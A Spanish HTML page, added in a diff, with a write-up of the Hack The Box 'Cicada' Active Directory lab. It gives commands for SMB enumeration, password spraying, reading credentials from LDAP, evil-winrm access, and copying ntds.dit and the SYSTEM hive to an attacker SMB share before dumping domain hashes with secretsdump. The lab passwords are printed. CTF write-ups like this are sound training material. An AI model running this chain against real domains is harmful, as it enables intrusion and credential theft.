@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Cicada HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/cicada/pasted-image-20260304111837.png" alt="Cicada HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Cicada</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>SMB</span>
+            <span>LDAP</span>
+            <span>WinRM</span>
+            <span>backup_operators</span>
+            <span>backup</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Lista de usuarios y share con una contraseña expuesta</li>
+            <li><code>Explotación</code>: Password Spray contra usuarios del dominio con la contraseña encontrada</li>
+            <li><code>Movimiento lateral</code>: Descripción de usuario en <code>LDAP</code> que revela credenciales</li>
+            <li><code>Movimiento lateral</code>: Share con credenciales expuestas</li>
+            <li><code>Escalada de Privilegios</code>: Grupo <code>Backup Operators</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/cicada/pasted-image-20260304115128.png" alt="Cicada HTB" />
+          <div class="code-card">
+            <h3>Lista usuarios</h3>
+            <pre><code>nxc smb 10.129.16.41 -u &#x27;Guest&#x27; -p &#x27;&#x27; --rid-brute</code></pre>
+          </div>
+          <div class="code-card">
+            <pre><code>smbclient //10.129.16.41/HR -N -c &quot;recurse; prompt; mget *;&quot;
+# Contraseña: Cicada$M6Corpb*@Lp#nZp!8</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cicada/pasted-image-20260304115920.png" alt="Cicada HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Password Spray contra usuarios del dominio con la contraseña encontrada</h2>
+          <div class="code-card">
+            <h3>Password Spray</h3>
+            <pre><code>nxc smb 10.129.16.41 -u users -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27; --continue-on-succes
+# Credenciales -&gt; michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Descripción usuario que revela credenciales</h2>
+          <div class="code-card">
+            <h3>Descripción usuario</h3>
+            <pre><code>nxc smb 10.129.16.41 -u &#x27;michael.wrightson&#x27; -p &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27; --users
+# Alternativa
+ldapsearch -x -H ldap://10.129.16.41 -D &#x27;michael.wrightson@cicada.htb&#x27; -w &#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27; -b &#x27;DC=cicada,DC=htb&#x27; |  grep -iE &quot;pass&quot; -C 2
+# Credenciales -&gt; david.orelious:aRt$Lp#7t*VQ!3</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cicada/pasted-image-20260304122533.png" alt="Cicada HTB" />
+          <img class="writeup-image" src="/writeups/assets/cicada/pasted-image-20260304122715.png" alt="Cicada HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Share con credenciales expuestas</h2>
+          <div class="code-card">
+            <h3>Dumpear Shrare</h3>
+            <pre><code>smbclient //10.129.16.41/DEV -U &#x27;david.orelious%aRt$Lp#7t*VQ!3&#x27; -c &quot;recurse; prompt; mget *;&quot;
+# Credenciales -&gt; emily.oscars:Q!3@Lp#M6b*7t*Vt</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cicada/pasted-image-20260304123044.png" alt="Cicada HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i cicada.htb -u emily.oscars -p &#x27;Q!3@Lp#M6b*7t*Vt&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Grupo <code>Backup Operators</code></h2>
+          <div class="code-card">
+            <h3>Shadow.txt -&gt; Añadir un espacio al final de cada linea</h3>
+            <pre><code>set context persistent nowriters 
+add volume c: alias unidad 
+create 
+expose %unidad% z: </code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Lanzar diskshadow desde un fichero</h3>
+            <pre><code>diskshadow.exe /s c:\Temp\shadow.txt</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cicada/pasted-image-20260304025808.png" alt="Cicada HTB" />
+          <div class="code-card">
+            <h3>Recuperar el fichero ntds.dit que se encuentra en originalmente en c:\Windows\NTDS\ desde z:\Windows\NTDS\</h3>
+            <pre><code>robocopy /b z:\Windows\NTDS\ . ntds.dit</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Transferir archivo con SMB</h3>
+            <pre><code># Kali
+impacket-smbserver recurso $(pwd) -smb2support
+# Windows
+copy ntds.dit //10.10.16.130/recurso/
+reg.exe save hklm\system \\10.10.16.130\recurso\SYSTEM.save</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Kali: Dumpear ntds.dit</h3>
+            <pre><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM.save -hashes lmhash:nthash LOCAL
+# Obtenemos todos los hashes del dominio
+# Administrator -&gt; aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>SMB</span>
+            <span>LDAP</span>
+            <span>WinRM</span>
+            <span>backup_operators</span>
+            <span>backup</span>
+            <span>robocopy</span>
+            <span>diskshadow</span>
+            <span>ntds</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
